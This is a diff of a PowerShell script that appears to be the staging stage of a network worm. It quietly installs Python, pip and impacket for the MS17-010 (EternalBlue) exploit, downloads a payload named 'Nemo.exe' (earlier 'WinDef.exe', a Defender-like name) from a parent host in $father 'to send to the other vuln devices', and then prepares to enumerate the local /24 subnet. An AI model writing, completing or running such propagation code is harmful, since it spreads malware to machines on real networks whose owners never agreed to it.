@@ -7,7 +7,6 @@ $save_dir = $env:temp
 # Add x84 and x64 options
 
 
-
 function get_wget {
         $filename = "wget.exe"
         $wgetBinLocation = '' + $save_dir + '\' + $filename;
@@ -18,7 +17,6 @@ function get_wget {
         (New-Object System.Net.WebClient).DownloadFile($url, $wgetBinLocation)
         return $wgetBinLocation
 }
-
 
 
 function download_file_and_install($url,$name,$wgetBinLocation){
@@ -35,9 +33,8 @@ Start-Process -FilePath "msiexec.exe"  -Args "/a $Location /qb TARGETDIR=C:\pyth
 }
 
 
-
-
-# First Downlaod wget
+######################################################################################################
+# First, Downlaod wget
 $wgetBinLocation = get_wget
 
 
@@ -52,14 +49,15 @@ download_file_and_install "https://www.python.org/ftp/python/2.7.16/python-2.7.1
 $Location = '' + $save_dir + '\' + 'get-pip.py';
 Start-Process -FilePath $wgetBinLocation -Args " https://bootstrap.pypa.io/get-pip.py -O $Location" -passthru -NoNewWindow -Wait
 
-# Install impacket
+# Install impacket - Why? Becasue worawit/MS17-010 uses it
 python $Location
 python -m pip  install impacket
 
 
-# Download WinDef.exe
-$Location = '' + $save_dir + '\' + 'WinDef.exe';
-Start-Process -FilePath $wgetBinLocation -Args " http://$father/WinDef.exe -O $Location" -passthru -NoNewWindow -Wait
+# Download Nemo.exe/WinDef.exe to send to the other vuln devices.
+$Location = '' + $save_dir + '\' + 'Nemo.exe';
+Start-Process -FilePath $wgetBinLocation -Args " http://$father/Nemo.exe -O $Location" -passthru -NoNewWindow -Wait
+
 
 # Get all valid IPs (The IPs in /24)
 # For example: If the target has 192.168.1.1 it will get all 192.168.1.0/24 IPs
